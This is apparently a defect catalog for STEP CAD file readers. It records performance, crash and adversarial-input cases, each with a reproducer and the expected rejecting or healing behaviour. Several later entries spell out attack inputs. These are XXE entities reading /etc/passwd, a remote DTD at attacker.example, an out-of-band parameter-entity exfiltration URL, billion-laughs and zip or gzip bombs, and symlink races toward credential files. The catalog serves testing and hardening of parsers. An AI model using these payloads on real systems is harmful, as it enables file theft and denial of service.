description: STEP files exceeding 1 GB cause downstream consumers (Inventor, AutoCAD, Navisworks) to allocate memory unboundedly until OOM even on hosts with 96 GB RAM. The producing kernel re-imports the same file successfully, so the file is not corrupt; the receiver simply cannot scale.
expected_kernel_behavior: streaming/lazy reader with bounded peak memory; partial-load via configurable `max_instances`; abort with `E_INSTANCE_LIMIT` rather than thrash.
notes: PTC community thread documents the symptom; Mantis 32127 / **See also**: Pf013, Pf017. Provenance tier: runtime-only (Q5 reclassification 2026-07-01).
reproducer: AP242 STEP with thousands of `MANIFOLD_SOLID_BREP`s in nested `NEXT_ASSEMBLY_USAGE_OCCURRENCE` chains, total size > 1 GB.
sender: PTC Creo (large 1+ GB AP242 assemblies)
title: Multi-GB Creo AP242 assemblies trigger unbounded receiver memory

description: `write_step_file` on a 214 423-entity model takes ~30 minutes, dominated by repeated linear scans over the entity table while serializing references. Common shape: a dense forward-reference `VERTEX_POINT` / `EDGE_CURVE` / `ADVANCED_FACE` web sized to tens of thousands of entities each, exercising O(N²) writer reference-resolution cost.
expected_kernel_behavior: Heal and accept (performance contract): sub-minute write at 200k entities via amortized O(N) writer with indexed reference resolution. Must not hang.
notes: Provenance tier: runtime-only (Q5 reclassification 2026-07-01). amortized O(N) writer with indexed reference resolution.
reproducer: Convert any IFC architectural model with > 100k entities through OCCT's STEP writer; time the write phase.
sender: IFC pipeline (FZK Haus IfcStair) → OCCT writer
title: Quadratic-cost STEP write on dense forward-reference `VERTEX_POINT` / `EDGE_CURVE` / `ADVANCED_FACE` web (200k-entity scale)

description: A nominally small (20 MB) STEP takes ~50 s to read; the C++ reader is single-threaded so language-level threads do not help. Common shape: every `ADVANCED_FACE` in DATA references forward to later `EDGE_LOOP` / `EDGE_CURVE` / `VERTEX_POINT` entities, forcing the reader to perform many forward-resolve passes over the entity table.
expected_kernel_behavior: Heal and accept (performance contract): bounded, parallelism-friendly read path; recover from forward-reference DATA sections without quadratic resolution. Must not hang.
reproducer: Time `read_step_file('20mb.stp')`; profile shows parser + reference-resolution dominate.
title: 50-second read on a 20 MB STEP: forward-reference DATA section forces multi-pass resolution (single-threaded)

description: STEP files with thousands of `GEOMETRIC_SET` items (points/curves) cause slow import because matching uses linear scan.
expected_kernel_behavior: Heal and accept (performance contract): use bbox indexing for matching / locating geometric-set elements; coerce the lookup to sub-quadratic. Must not hang on geometric-set-heavy files.
notes: Provenance tier: runtime-only (Q5 reclassification 2026-07-01). amortized O(N log N).
reproducer: STEP with > 10k `CARTESIAN_POINT` / `LINE` / `B_SPLINE_CURVE_WITH_KNOTS` entries inside `GEOMETRIC_SET`s.

description: ~90 % of STEP read time on sheet-metal parts with thousands of holes is spent inside shape-healing's wire self-intersection check, which almost never finds real defects but is paid per wire per face.
expected_kernel_behavior: Heal and accept: skip the self-intersection check by default on simple input; reject only when the caller opts in and the check fails. Must not hang on perforated sheets.
notes: **See also**: N042. Provenance tier: runtime-only (Q5 reclassification 2026-07-01).
reproducer: STEP of a flat sheet with > 1000 small circular holes; time `STEPControl_Reader::TransferRoots`.
title: Quadratic self-intersection check dominates STEP read on perforated sheets

description: Querying the supporting surface of a face eagerly walks every edge of every bounding wire to compute UV bounds, even when the caller only needs the surface type. Common shape: an `ADVANCED_FACE` with one outer bound plus many circular inner `FACE_BOUND` holes on a single plane (perforated sheet); the cost multiplies by hole count, producing quadratic-in-feature-count writer time.
expected_kernel_behavior: Heal and accept (performance contract): lazy UV-bound computation; cheap type-only surface queries that do not trigger eager wire-walks. Must not hang on faces with many holes.
reproducer: time the STEP writer's transfer pass on a sheet with thousands of holes.
title: `ADVANCED_FACE` with many circular inner `FACE_BOUND` holes triggers eager UV-bounds wire-walk on every type-only surface query

description: A large industrial STEP file (electronics enclosure, ~100 MB on disk, with thousands of `NEXT_ASSEMBLY_USAGE_OCCURRENCE`) saturates one CPU core during import while the resident set grows unboundedly until OOM. The producing kernel re-imports the file successfully on a host with 256 GB RAM. The receiver-side defect is that the `MAPPED_ITEM` resolver computes the closure of the `REPRESENTATION_MAP` graph eagerly rather than lazily, materialising every instance's geometry up-front. Distinct from Pf001 because the file size is well below 1 GB but the *graph closure* is what blows up.
expected_kernel_behavior: Heal and accept: lazy resolution of `MAPPED_ITEM` references; bounded peak memory. Reject with `E_INSTANCE_LIMIT` diagnostic when configurable `max_instances` and `max_depth` cutoffs are exceeded. Must not infinite loop, must not OOM the host, must not crash.
notes: **See also**: Pf001, Pf013. Synonyms: "100% CPU and OOM on STEP load", "NUC12 STEP file hangs FreeCAD", "deeply-nested assembly graph blows memory", "MAPPED_ITEM closure explodes". Provenance tier: runtime-only (Q5 reclassification 2026-07-01). DRIFT audit 2026-07-12: original construction self-referenced every NAUO (`#9054,#9054`), which OCCT treats as "used"/non-root — transfer silently produced 0 shapes, contradicting the "silently accepts on small fixture" claim below. Repaired to relate the root to a genuine child `PRODUCT_DEFINITION` (also fixed a swapped `MAPPED_ITEM` arg order); live-verified `occt=shape(1)` on the small fixture per this entry's own claim.
reproducer: STEP assembly with a single `REPRESENTATION_MAP` referenced by 50+ `MAPPED_ITEM`s arranged in a deeply nested `NEXT_ASSEMBLY_USAGE_OCCURRENCE` chain (depth 10+), each level multiplying the closure size.
sender: Industrial CAD assemblies in the 100 MB+ size range with deeply nested `NEXT_ASSEMBLY_USAGE_OCCURRENCE` graphs (Intel NUC12 reference design).
sources: bug-reporter language: "STEP: Crash when loading NUC12STEP file (linked)", "sometimes crashes on its own, sometimes hanging with 100% CPU usage", "memory usage increasing until OOM".
title: Large assembly STEP loads at 100% CPU with unbounded memory growth until OOM

description: A `MAPPED_ITEM` references a `REPRESENTATION_MAP` whose `mapped_representation` ultimately contains the original `MAPPED_ITEM`. The reader's resolution recursion does not detect the cycle; it keeps descending until the call stack overflows or the process hangs indefinitely. This is a denial-of-service vector for STEP-consuming services that accept untrusted input.

category: §12.10 scale & performance (sub-class: silent partial subgraph elision)
description: BRL-CAD step-g uses a two-pass loader: pass-1 walks the DATA section and instantiates one C++ object per STEP entity, registering each via id; pass-2 walks the list again, calling `Load()` on each object, which dereferences forward references through the id→object map. When a referenced id was never created in pass-1 (or has `entity_status = STEP_LOAD_ERROR`), pass-2 marks the *referencing* entity also as `STEP_LOAD_ERROR` and emits a single `WARNING: <name> is not valid` to `bu_log`. But the upstream caller does **not** check `entity_status` for the shells/solids it consumes; the shape-definition path completes with whatever fragments it managed to build, and the resulting .g file lacks the entire subgraph that depended on the broken reference. On large assemblies the user only notices the truncation after a multi-minute import; the diagnostic stream is too noisy to spot the specific WARNING line.
expected_kernel_behavior: reject; every shell/solid consumer in `LoadONBrep` must consult `entity_status` of every dereferenced child and bubble up `STEP_LOAD_ERROR`; the top-level converter must abort with a non-zero exit code rather than write a partial .g file.
notes: **See also**: Wr013, Ad005, Pf003. Synonyms: "BRL-CAD step-g silent partial subgraph elision", "STEP_LOAD_ERROR not propagated to caller", "WARNING is not valid hidden in noise", "two-pass loader truncates on dangling forward ref", "step-g writes partial .g without exit code".
reproducer: STEP file containing a topology entity that references id `#999` which is never defined. Pass-1 instantiates the entity; pass-2 sets `STEP_LOAD_ERROR`; the parent shape is silently truncated.
sender: Large-assembly STEP files where one entity record is structurally well-formed (so pass-1 instantiates a stub object) but references a downstream entity that itself failed to instantiate (e.g. a malformed complex-entity record). Common in fuzzed inputs and in CAD-system exports that emit forward references the writer never validated.
sources: `entity_status[id] = STEP_LOAD_ERROR` set during pass-2 but never consulted by shell/solid consumers

bug-reporter language: "step-g imports a 50 MB STEP file and the resulting .g lacks a subassembly with no obvious error", "WARNING is not valid scrolled past in the import log", "step-g entity_status STEP_LOAD_ERROR not propagated".

description: A translator catches all exceptions at the per-entity boundary and downgrades them uniformly to a "transfer failed" status, hiding memory-corruption-class faults. Common attack shape: a single file combining several type-confusion / overflow attacks; `AXIS2_PLACEMENT_3D` whose location slot points at a `PRODUCT_DEFINITION` (`#7`) instead of a `CARTESIAN_POINT`; a `CARTESIAN_POINT` whose coordinates list has length 2 (arity mismatch); another point with coordinate `1.0E+999` (numeric overflow); a `LINE` whose direction `VECTOR` references a `CARTESIAN_POINT` (`#15`) where `DIRECTION` is required. CI test infrastructure documents these as "expected to be tolerated", masking actual exploitable conditions.
expected_kernel_behavior: Reject with clear diagnostic: distinguish recoverable diagnostics (syntax error, missing reference) from memory-corruption-class faults; the latter must surface as fatal kernel bugs with a clear diagnostic, not silent skips. Must not silently mask crashes.
notes: **See also**: Ad043. Provenance tier: runtime-only; bytes alone cannot demonstrate this defect; the catalogued symptom is a translator-time access-violation being silently demoted to "transfer failed" status. The static fixture encodes only the trigger (type-confusion / overflow attributes); whether the kernel produces an access violation, swallows it, and what status it reports are all multi-pass runtime behaviors. A behavioral test capturing the kernel's diagnostic stream is the appropriate venue.
reproducer: any input that triggers an access-violation in translator.
title: Translator silently masks segfault-class faults as "transfer failed" on type-confused / overflow attribute references

reproducer: Read 100 STEP files in succession into a single process; observe memory growth proportional to the number of files even when each document is destroyed.
sources: OCCT MANTIS#0022941 (OCCT MANTIS tracker 502 as of 2026-05-02)

description: A wire's edge-curves-fix pass iterates edges and reads the next edge's first parameter. On an open wire (EDGE_LOOP whose ORIENTED_EDGEs do not connect end-to-start, i.e. a non-closed wire) whose last edge has been removed during the fix, the iterator continues past end-of-vector and throws an out-of-range error. Fixture pattern: EDGE_LOOP containing three ORIENTED_EDGEs forming a non-closed v0->v1->v2->v3 chain.
expected_kernel_behavior: wire-fix iteration uses bounds-checked iterators and re-validates edge count after each modification.
notes: **See also**: Twi051, Twi064. **OCC behavior**: silently accepts (no diagnostic, empty result); outside catalog's allowed set ({heal}). Kernel-bug witnessed: catalog asks for healing; OCC neither heals nor rejects; the input is dropped on the floor without diagnostic.
reproducer: Open wire of three edges (EDGE_LOOP not closed); first fix removes the last edge; subsequent step accesses `edges[3]`.
sources: OCCT MANTIS#0029780 (OCCT MANTIS tracker 502 as of 2026-05-02)
title: Wire edge-curve healing reads past end of edge list after edge removal (open EDGE_LOOP / non-closed 3-edge wire)

description: A shape produced by Hidden Line Removal (HLR) consists of 2D edges in 3D space (no faces, no surfaces). The STEP writer's topology-to-STEP translator expects every edge to belong to a face; segfaults on the bare-edge HLR result.
expected_kernel_behavior: Heal and accept: writer handles bare-edge / bare-vertex shapes; emit them as `WIRE_SHELL` representations with no face references. Must not crash on bare shapes.
notes: **See also**: Tsh037.
reproducer: Compound of `EDGE_CURVE`s with no incident face; pass to STEP writer.
sources: OCCT MANTIS#0027070 (OCCT MANTIS tracker 502 as of 2026-05-02)

description: A vertex-union step is invoked on two vertices that are marked already-merged from a previous pass. The internal index of merged vertices is queried with one of the vertices, returning a stale entry pointing at a freed vertex object — accessed afterwards. Fixture precondition: two distinct VERTEX_POINTs reference separate CARTESIAN_POINT entities with identical coordinates (e.g. both at (0,0,0)) — coincident vertices that have not been merged.
expected_kernel_behavior: Heal and accept: vertex-union table is updated atomically; callers can re-query absorbed vertices and get the canonical replacement. Must not throw on already-absorbed vertex.
notes: **See also**: Tsh050, N045. Provenance tier: runtime-only; bytes alone cannot demonstrate this defect; the symptom is a use-after-free against the vertex-union table during a second merge pass. The static fixture encodes only the input precondition (coincident vertices); the stale-entry access requires the kernel to perform two successive merge operations and retain the multi-pass merge state.
reproducer: Two VERTEX_POINTs V1, V2 referencing CARTESIAN_POINTs at the same coordinates. Union them once (V2 absorbed into V1). Then attempt to union V2 again with V3.
sources: OCCT MANTIS#0024919 (OCCT MANTIS tracker 502 as of 2026-05-02)
title: Coincident VERTEX_POINTs at identical CARTESIAN_POINT coordinates trigger vertex-merge healing throws on already-absorbed vertex

description: ISO 10303-28 specifies an XML transfer of STEP data. A STEP-XML file may include an internal DTD; XML 1.0 permits an internal DTD to declare a named entity that resolves to an external resource (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`). A receiver that uses an XML parser with external-entity resolution enabled fetches the resource, expands it into the document, and either leaks the content (if the entity is referenced inside an attribute that is later echoed back) or hangs (if the URI points at a slow resource). This is the textbook XXE attack applied to the STEP-XML wrapper.
expected_kernel_behavior: disable external-entity resolution by default in the XML parser used to load STEP-XML; reject documents that declare external-entity references with a precise diagnostic; treat as adversarial.
notes: First entry exercising the STEP-XML wrapper as an attack surface. Synonyms: "XXE in STEP", "STEP-XML external entity", "billion-laughs sibling for XML", "DTD reads sensitive file", "external entity in STEP-XML". Provenance tier: cross-file-state. The defect is in the .stpx wrapper, not in the .stp body; bytes-level demonstration is in the XML-prologue layer. **OCC behavior**: silently accepts (no diagnostic, empty result); outside catalog's allowed set ({reject}). Kernel-bug witnessed: receivers must reject this fixture per the catalog's stated invariant.
reproducer: a `.stpx` (STEP-XML) file beginning with `<?xml version="1.0"?> <!DOCTYPE step [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <step ..>&xxe;</step>`. The entity reference `&xxe;` resolves to the file's contents on parsers with XXE enabled.
sender: deduced — adversarial input or buggy producer that ships an internal DTD plus the parser is XML-1.0-compliant with external entities enabled
sources: bug-reporter language: "STEP-XML triggers XXE", "DTD entity reference reads /etc/passwd"
title: STEP-XML wrapper carries a DTD with external-entity reference (XXE)

description: The `.stpz` and `.stpx` extensions denote ZIP / gzip-archive variants of STEP transfer. A maliciously-crafted archive can claim gigabytes of uncompressed payload from a few kilobytes of input — the standard ZIP-bomb / gzip-bomb pattern. A receiver that decompresses into memory before parsing exhausts RAM or swap. The defect is at the archive-wrapper layer, not in the STEP bytes. Bug-reporter language: "STEP archive bomb", "stpz allocates gigs", "decompression OOM on STEP". Provenance tier: cross-file-state — bytes alone (a STEP body) cannot demonstrate this; the demonstration is in the archive wrapper plus the receiver's decompression policy.
expected_kernel_behavior: cap the per-archive-entry decompression budget (size, time); refuse to load when the budget is exceeded with a precise diagnostic; treat the archive layer as adversarial.
notes: First entry exercising the .stpz / .stpx archive wrapper as an attack surface. **See also**: Ad104. Provenance tier: cross-file-state; bytes alone cannot demonstrate this defect; the bomb lives in the archive header, not the embedded STEP body. The static `.stp` fixture encodes only the embedded body; the receiver-side amplification requires an actual archive wrapper. **OCC behavior**: OCC accepts and loads a valid shape(1); the declared decompression bomb lives in the `.stpz`/`.stpx` archive-header wrapper, not in this embedded Part-21 body. Base and clean give identical shape-counts and validity; shape(1) does not witness a kernel bug.
reproducer: a ZIP archive whose entry header advertises uncompressed size of 10 GB but whose compressed bytes are tiny (highly-compressible repeated bytes); the entry contains a 100-character STEP body. Cannot be embodied as a Part-21 fixture; the defect lives in the archive layer.
sender: deduced — adversarial input
sources: bug-reporter language: "STEP archive crashes the loader", "stpz file allocates 4 GB"
title: `.stpz` / `.stpx` archive container claims gigabytes of uncompressed data

description: An EXTERNAL_FILE entry references a sibling Part-21 file via a path. A receiver that follows the path performs at minimum two filesystem operations: a stat / access check (to verify the file exists, is the right type, fits a size budget) and an open (to read the bytes). On systems where the path resolves through a symlink, the symlink target may change between the check and the open; the classic TOCTOU race. A receiver that validates the stat result then opens the path can read a different file than it validated. Bug-reporter language: "STEP file follows symlink", "external-file resolves to wrong path", "TOCTOU race in STEP load".
expected_kernel_behavior: open the path once and stat the resulting file descriptor; never re-resolve the path between check and open. Refuse to follow symlinks unless explicitly enabled. Reject EXTERNAL_FILE paths that resolve outside a configured root directory.
notes: Provenance tier: cross-file-state; bytes alone cannot demonstrate this defect; the symptom is a filesystem-race between path-resolution operations on the receiver side. The static fixture encodes only the path-naming precondition; the symlink-swap requires receiver-side filesystem manipulation. **OCC behavior**: emits a diagnostic but produces no shape (warn-and-proceed by oracle, but result is empty); outside catalog's allowed set ({reject}). Kernel-bug witnessed: receivers must reject this fixture per the catalog's stated invariant.
reproducer: a STEP file whose REFERENCE / EXTERNAL_FILE clause names a path `/tmp/parts/widget.stp`; the receiver-side filesystem is set up so `/tmp/parts/widget.stp` is a symlink that the attacker can swap between the check and the open. The STEP body alone establishes only the path-naming side; the demonstration requires the receiver-side filesystem manipulation.
sender: deduced — adversarial filesystem context, or a multi-process pipeline where one process writes a file and another renames the path between check and open
sources: bug-reporter language: "STEP external-file resolves to wrong path", "symlink race on STEP load"
title: `EXTERNAL_FILE` URI resolves through a symlink (TOCTOU race)

description: ISO 10303-28 specifies an XML transfer of STEP data. A STEP-XML file may include an internal DTD; XML 1.0 permits an internal DTD to declare named entities that reference other named entities. The classic billion-laughs construction declares `&lol;` as ten `&lol1;` references, `&lol1;` as ten `&lol2;` references, and so on; expansion produces 10^N copies of the leaf string from N+1 entity declarations. A receiver whose XML parser does not cap entity-expansion depth or expanded-text size allocates gigabytes from a one-kilobyte input. Bug-reporter language: "STEP-XML billion laughs", "entity expansion DoS", "recursive XML entities in STEP".
expected_kernel_behavior: cap entity-expansion depth and expanded-text size in the XML parser used to load STEP-XML; reject documents that exceed the cap with a precise diagnostic; treat as adversarial.
notes: Sibling of Ad104 (XXE via SYSTEM URI); both attack the STEP-XML wrapper. Synonyms: "billion laughs in STEP", "XML entity bomb in STEP-XML", "exponential entity expansion". Provenance tier: cross-file-state; defect is in the .stpx wrapper's DTD layer, not in the .stp body; bytes-level demonstration is the XML prologue. **See also**: Ad104, Ad108, Ad109. **OCC behavior**: silently accepts (no diagnostic, empty result); outside catalog's allowed set ({reject}). Kernel-bug witnessed: receivers must reject this fixture per the catalog's stated invariant.
reproducer: a `.stpx` (STEP-XML) file with an internal DTD declaring `<!ENTITY lol "lol">` then `<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">` repeated through `&lol9;`, with the document body referencing `&lol9;` inside an attribute value.
sender: deduced — adversarial input that exercises the XML-1.0 entity-expansion path with recursively-defined internal entities
sources: bug-reporter language: "STEP-XML hangs the loader", "DTD entity expansion blows up memory"
CWE-776 (improper restriction of recursive entity references)
title: STEP-XML wrapper carries a billion-laughs entity-expansion bomb

description: ISO 10303-28 specifies an XML transfer of STEP data. The DOCTYPE declaration may name an external DTD via a `SYSTEM` identifier (`<!DOCTYPE step SYSTEM "http://attacker.example/evil.dtd">`); a receiver whose XML parser resolves external DTDs by default fetches the URL on every load. The fetched DTD can declare further external entities, redirect, or simply hang. Even without entity expansion this leaks the receiver's IP / load timing to the URL owner, and on slow networks blocks the load indefinitely. Bug-reporter language: "STEP-XML loader hits the network", "external DTD reference in STEP", "DOCTYPE SYSTEM URL fetched on load".
expected_kernel_behavior: disable external-DTD resolution by default in the XML parser used for STEP-XML; reject documents whose DOCTYPE names an external SYSTEM identifier with a precise diagnostic; treat as adversarial. If a producer legitimately needs DTD validation, require the DTD to be inlined.
notes: Twin of Ad104 (external entity inside the document); this entry attacks the DOCTYPE itself. Synonyms: "external DTD in STEP-XML", "remote DTD fetch", "XXE via DOCTYPE SYSTEM". Provenance tier: cross-file-state; defect is in the .stpx wrapper, not in the .stp body. **See also**: Ad104, Ad107, Ad109. **OCC behavior**: silently accepts (no diagnostic, empty result); outside catalog's allowed set ({reject}). Kernel-bug witnessed: receivers must reject this fixture per the catalog's stated invariant.
reproducer: a `.stpx` file beginning `<?xml version="1.0"?> <!DOCTYPE step SYSTEM "http://attacker.example/evil.dtd"> <step ..>..</step>`; the DTD URL is unreachable / slow / hostile.
sender: deduced — adversarial input or a producer that ships a DOCTYPE with an external `SYSTEM` identifier
sources: bug-reporter language: "STEP-XML loader fetches remote DTD", "DOCTYPE points at evil URL"
title: STEP-XML DOCTYPE references an external DTD over the network

description: ISO 10303-28 STEP-XML inherits the full XML-1.0 entity model, including parameter entities (declared with `%`). An adversary uses a chain of parameter entities to read a local file, embed its contents into a synthesised URL, and emit the URL via an external DTD fetch; the classic out-of-band XXE exfiltration. The .stpx file declares `<!ENTITY % file SYSTEM "file:///etc/passwd">` and `<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.example/?x=%file;'>">`, then references `%eval; %exfil;`. A receiver with parameter-entity resolution enabled fetches the file, embeds it into the URL, and POSTs to the attacker. Bug-reporter language: "STEP-XML out-of-band XXE", "parameter entity reads /etc", "exfiltration via DTD fetch".
expected_kernel_behavior: disable parameter-entity resolution by default in the XML parser used for STEP-XML; reject documents that declare parameter entities with external SYSTEM identifiers; treat as adversarial.
notes: Strongest of the XXE family — combines local-file read with network exfiltration. Synonyms: "OOB-XXE", "parameter entity XXE", "data exfiltration via DTD". Provenance tier: cross-file-state — defect is in the .stpx wrapper, not in the .stp body. **See also**: Ad104, Ad107, Ad108. **OCC behavior**: silently accepts (no diagnostic, empty result); outside catalog's allowed set ({reject}). Kernel-bug witnessed: receivers must reject this fixture per the catalog's stated invariant.
reproducer: a `.stpx` file with an internal DTD declaring three parameter entities (`%file` reads the local resource; `%eval` builds a URL containing `%file`'s value; `%exfil` is the attacker URL fetched by the parser); the document body references `%exfil;` inside an attribute value.
sender: deduced — adversarial input that exercises XML-1.0 parameter-entity expansion plus an external DTD fetch
sources: bug-reporter language: "STEP-XML leaks file via parameter entity", "OOB-XXE in STEP loader"
title: STEP-XML parameter-entity injection exfiltrates local file via out-of-band DTD

description: The `.stpz` extension denotes a gzip-wrapped Part-21 file. Gzip compresses long runs of identical bytes at ratios approaching 1:1024 per DEFLATE block, and a multi-block stream can chain to an aggregate ratio of 1:10000 or more. An attacker ships a .stpz file of ~3 KB whose decompressed body is 30+ MB of repeated `;` or whitespace; with multiple stacked gzip members or a single very-redundant payload, the decompressed size reaches gigabytes. A receiver that calls a streaming gunzip into a single buffer exhausts RAM. Distinct from Ad027 / Pf030 (instance-count bombs at the parser layer): the bomb is at the gzip layer and triggers before any Part-21 token is seen. Bug-reporter language: "stpz decompression bomb", "gzip ratio explodes", "Part-21 reader OOMs on tiny .stpz".
expected_kernel_behavior: cap the per-stream decompressed-byte budget; abort decompression when the budget is exceeded with a precise diagnostic; treat the gzip layer as adversarial. Stream the decompressed bytes through the Part-21 tokeniser rather than buffering the whole expansion.
notes: Distinct from Ad027 (instance-count bomb at parser layer) and Ad105 (archive header lies about size — Ad105 is detectable from the header alone, this entry's gzip stream actually produces the bytes when decoded). **See also**: Ad027, Ad105, Ad111, Ad112, Pf030. Provenance tier: cross-file-state — bytes alone (a Part-21 body) cannot demonstrate this defect; the bomb is in the gzip wrapper.
reproducer: a `.stpz` file consisting of a gzip stream whose payload is e.g. 4 GB of repeated `' '` bytes plus a minimal Part-21 envelope; the compressed file is ~4 KB. The fixture in this catalog is the embedded Part-21 body for cataloguing only; the bomb itself lives in the gzip wrapper.
sender: deduced — adversarial input that exercises the .stpz gzip-wrapper decompression path with a highly-compressible payload
sources: bug-reporter language: "stpz file blows up loader memory", "gzip ratio crashes STEP reader"
title: `.stpz` gzip wrapper expands ratio 1:10000 into multi-gigabyte body

description: 3MF and IFCZIP are STEP-adjacent container formats: a ZIP archive whose entries include a Part-21 body (or an XML-encoded equivalent) plus auxiliary metadata. A maliciously-crafted ZIP archive carries one entry whose compressed bytes are tiny but whose uncompressed bytes claim gigabytes; the textbook ZIP bomb (`42.zip`-style nested archives, or a single highly-redundant entry). A receiver that extracts entries to a tempdir before parsing exhausts disk; one that decompresses to memory exhausts RAM. Distinct from Ad105 (archive-header lie): in this entry, the ZIP entry actually decompresses to the claimed size. Bug-reporter language: "3MF bomb", "IFCZIP decompression OOM", "ZIP entry blows up CAD loader".
expected_kernel_behavior: cap the per-entry decompression budget and abort with a precise diagnostic when exceeded; cap the per-archive total budget; refuse archives with implausible entry-count / total-size combinations; treat the container layer as adversarial.
notes: Companion to Ad110 (gzip wrapper) — different container, same defect class. Distinct from Ad105 (archive *header* lies; this entry's bomb actually decompresses). **See also**: Ad027, Ad105, Ad110, Ad112, Pf030. Provenance tier: cross-file-state — bytes alone (a Part-21 body) cannot demonstrate this defect; the bomb is in the ZIP wrapper. **OCC behavior**: OCC accepts and loads a valid shape(1); the declared ZIP bomb lives in the 3MF/IFCZIP container wrapper, not in this embedded Part-21 body. Base and clean give identical shape-counts and validity; shape(1) does not witness a kernel bug.
reproducer: a 3MF file (ZIP archive) containing a single entry `3D/3dmodel.model` whose compressed-vs-uncompressed ratio is 1:5000; the entry is valid 3MF XML when decompressed but ~2 GB long. Cannot be embodied as a Part-21 fixture; the defect lives in the ZIP wrapper.
sender: deduced — adversarial input that exercises the ZIP-container decompression path used by 3MF / IFCZIP / similar STEP-adjacent wrappers
sources: bug-reporter language: "3MF zip bomb", "IFCZIP allocates gigs"
ISO 10303-21 (STEP body inside an IFCZIP-style wrapper)
title: ZIP bomb inside a 3MF / IFCZIP container that wraps a STEP body

description: A receiver that auto-detects gzip framing (magic `1F 8B`) and decompresses transparently before tokenising will, on input that is gzip-of-gzip-of-..-of-Part-21, recurse into each layer. With N stacked layers of trivially-compressible content, the receiver allocates a buffer per layer; if recursion is implemented by recursive function calls the call-stack overflows. The aggregate decompression ratio is the product of per-layer ratios; 8 layers at 1:100 each yields 1:10^16. Distinct from Ad110 (single-layer ratio bomb): this entry attacks the layering depth, not the per-layer ratio. Bug-reporter language: "nested gzip in STEP", "recursive .stpz unwrap", "stack overflow on stpz-of-stpz".
expected_kernel_behavior: cap the gzip-layer recursion depth at 1 (or a small bounded N) with a precise diagnostic when exceeded; refuse files whose decompressed body still has the gzip magic at offset 0; treat the wrapper layer as adversarial.
notes: Companion to Ad110 (single-layer ratio bomb); orthogonal axis (depth, not ratio). **See also**: Ad027, Ad105, Ad110, Ad111, Pf030. Provenance tier: cross-file-state; bytes alone (a Part-21 body) cannot demonstrate this defect; the bomb is in the stack of gzip wrappers. **OCC behavior**: OCC accepts and loads a valid shape(1); the declared nested-gzip recursion bomb lives in the stacked `.stpz` wrapper layers, not in this innermost Part-21 body. Base and clean give identical shape-counts and validity; shape(1) does not witness a kernel bug.
reproducer: a Part-21 body wrapped in 8 successive gzip layers (each layer's input is the previous layer's gzip output); compressed final size is a few KB, decompressed final size is 100 MB+, and unwrapping requires 8 sequential gunzip passes.
sender: deduced — adversarial input that wraps a Part-21 body in N stacked gzip layers
sources: bug-reporter language: "stpz inside stpz crashes loader", "recursive gzip stack overflow on STEP"
title: Nested gzip-of-gzip-of-..stpz triggers N-level recursive decompression

description: The cad/research validator pairs each `.stp` fixture with an optional `.input.stp` sibling that captures the producer-side input. A receiver that reads `.input.stp` first (to populate its "expected input" oracle) and then reads `.stp` (the actual fixture) performs at least two independent path resolutions. If either path is a symlink that an attacker swaps between the two reads, the receiver sees a `.input.stp` that does not match the `.stp` it ultimately processes; the textbook TOCTOU race applied to the sibling-pair convention. A receiver that reports outcomes against the wrong input grades the wrong fixture. Bug-reporter language: "sibling-pair files don't match", "symlink swap on STEP test fixture", "validator races on .input.stp".
expected_kernel_behavior: open both paths atomically in a single resolve, or open the directory once and use `openat()` for both files; never re-resolve absolute paths between the two reads; refuse to follow symlinks in the fixture tree unless explicitly enabled.
notes: Sibling-pair-specific cousin of Ad106 (general EXTERNAL_FILE TOCTOU). Provenance tier: cross-file-state; bytes alone cannot demonstrate this defect; the symptom is a filesystem race between path-resolution operations. The static fixture is document-only: no real symlink is created in the repo. **See also**: Ad106, Ad114, Ad115. **OCC behavior**: silently accepts (no diagnostic, empty result); outside catalog's allowed set ({reject}). Kernel-bug witnessed: receivers must reject this fixture per the catalog's stated invariant.
reproducer: a `.input.stp` and `.stp` pair where one path is a symlink under attacker control; between the validator's read of `.input.stp` and its open of `.stp`, the symlink target is swapped. The bytes alone cannot demonstrate this; the demonstration requires a concurrent attacker process. **Important**: this fixture documents the scenario in a header comment but does NOT actually create a symlink in the repo (cross-platform unfriendly).
sender: deduced — adversarial filesystem context, or a multi-process pipeline where one process renames a sibling file between the receiver's two reads
sources: bug-reporter language: "STEP loader reads wrong file in sibling pair", "symlink swap between input and main STEP"
title: Symlink swap between read of `.input.stp` and read of `.stp` (sibling-pair TOCTOU)

description: A receiver that opens a fixture by name without checking whether the path traverses a symlink will follow symlinks transparently. If an attacker can place a symlink at the fixture path (or anywhere along its resolution chain) pointing at a privileged file (`/etc/passwd`, `~/.ssh/id_rsa`, `/proc/self/environ`), the receiver reads the privileged file's bytes and feeds them to the Part-21 tokeniser. Most privileged files do not parse as Part-21 and the load fails benignly, but the bytes have already been read into the receiver's address space and may appear in error messages, crash dumps, or telemetry. Bug-reporter language: "STEP fixture leaks /etc/passwd", "symlink in research tree", "kernel reads non-STEP file as STEP".
expected_kernel_behavior: refuse to open paths whose resolved location is outside a configured root; refuse to follow symlinks within the research tree unless explicitly enabled; check `O_NOFOLLOW`-style flags on open; refuse to dump bytes from a non-Part-21 file in error messages or telemetry.
notes: Companion to Ad106 (TOCTOU on EXTERNAL_FILE) and Ad113 (sibling-pair race) — a different angle on the same filesystem-trust defect class. Provenance tier: cross-file-state — bytes alone cannot demonstrate this defect; the symptom requires a symlink in the receiver-side filesystem. The static fixture is document-only: no real symlink is created in the repo (cross-platform-unfriendly). **See also**: Ad106, Ad113, Ad115. **OCC behavior**: silently accepts (no diagnostic, empty result); outside catalog's allowed set ({reject}). Kernel-bug witnessed: receivers must reject this fixture per the catalog's stated invariant.
reproducer: a `.stp` path in the research tree is a symlink to `/etc/passwd`. The receiver opens the path and reads ~3 KB of `root:x:0:0:..` bytes into its tokeniser. The fixture in this catalog documents the scenario in a header comment but does NOT actually create a symlink in the repo.
sender: deduced — adversarial filesystem context where a `.stp` fixture path is a symlink to a file the receiver should not read
sources: bug-reporter language: "STEP loader followed symlink to /etc/passwd", "fixture path resolves outside research root"
title: STEP fixture path is a symlink to `/etc/passwd` or other privileged file

